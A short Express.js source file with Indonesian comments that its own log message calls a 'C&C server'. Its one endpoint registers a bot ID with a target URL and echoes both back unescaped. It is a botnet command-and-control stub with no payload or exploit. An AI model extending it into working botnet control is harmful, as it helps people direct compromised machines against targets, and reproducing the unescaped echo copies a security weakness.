const express = require('express');
const app = express();
const port = 8080;

// Middleware untuk menerima URL dan menambahkan http:// jika tidak ada
app.use(express.json());

app.post('/register', (req, res) => {
  let { botId } = req.query;
  let { targetUrl } = req.body;

  // Jika URL tidak dimulai dengan http:// atau https://, tambahkan http://
  if (!/^https?:\/\//i.test(targetUrl)) {
    targetUrl = 'http://' + targetUrl;
  }

  console.log(`Bot ${botId} registered with target URL: ${targetUrl}`);
  res.send(`Bot ${botId} registered successfully with target URL: ${targetUrl}`);
});

app.listen(port, () => {
  console.log(`C&C server listening at http://localhost:${port}`);
});
